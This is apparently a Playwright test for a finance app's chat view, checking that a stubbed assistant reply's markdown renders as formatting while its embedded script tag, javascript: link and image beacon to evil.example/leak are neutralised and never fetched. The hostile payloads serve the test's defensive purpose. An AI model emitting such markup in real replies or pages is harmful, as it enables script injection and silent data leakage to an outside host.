import { expect, test } from "@playwright/test";
import { completeSetup, createAccount, createPerson, resetDatabase } from "./helpers";

test.beforeEach(() => resetDatabase());

// The model is stubbed: this checks how a reply is drawn, not what a model would say.
const REPLY = [
  "You're saving well, but **dining is the one to watch.**",
  "",
  "- **Food** is **₹21,400**, up 32% on August.",
  "- Cards owe **₹18,000**.",
  "",
  "| Month | Net out |",
  "| --- | --- |",
  "| August | ₹28,000 |",
  "| September | ₹37,054 |",
  "",
  "Review the [Dining category](https://example.com/dining).",
  "",
  "<script>window.__pwned = true</script> [bad](javascript:alert(1))",
  "",
  "![x](https://evil.example/leak?d=42)",
].join("\n");

test("the assistant's reply is drawn as formatted text, and its markup is never run", async ({ page, request }) => {
  const person = await createPerson(request);
  await createAccount(request, person, { name: "SBI Savings", type: "savings", institution: "SBI" });
  await completeSetup(request, person);
  const requested: string[] = [];
  page.on("request", (r) => requested.push(r.url()));
  await page.route("**/chat", (route) => {
    const events = [{ type: "session", session_id: "s1" }, { type: "tool", name: "get_trend", args: {} }, { type: "text", text: REPLY }, { type: "done" }];
    return route.fulfill({
      status: 200,
      contentType: "text/event-stream",
      body: events.map((e) => `data: ${JSON.stringify(e)}\n\n`).join(""),
    });
  });

  await page.goto("/");
  await page.getByRole("navigation", { name: "Main" }).getByRole("button", { name: "Ask" }).click();
  await page.getByRole("button", { name: "How am I doing overall?" }).click();

  const log = page.getByTestId("chat-log");
  await expect(log.getByText("checked trend")).toBeVisible();
  await expect(log.locator("strong", { hasText: "₹21,400" })).toBeVisible();
  await expect(log.getByRole("listitem")).toHaveCount(2);
  await expect(log.getByRole("table")).toBeVisible();
  await expect(log.getByRole("columnheader")).toHaveText(["Month", "Net out"]);
  await expect(log.getByRole("link", { name: "Dining category" })).toHaveAttribute("rel", /noopener/);
  await expect(log).not.toContainText("**"); // no raw markdown left on screen
  await expect(log.locator("script")).toHaveCount(0);
  await expect(log.locator("img")).toHaveCount(0); // an image would be fetched from another site
  expect(requested.filter((u) => u.includes("evil.example"))).toEqual([]);
  await expect(log.locator('a[href^="javascript"]')).toHaveCount(0);
  expect(await page.evaluate(() => (window as unknown as { __pwned?: boolean }).__pwned)).toBeUndefined();
});
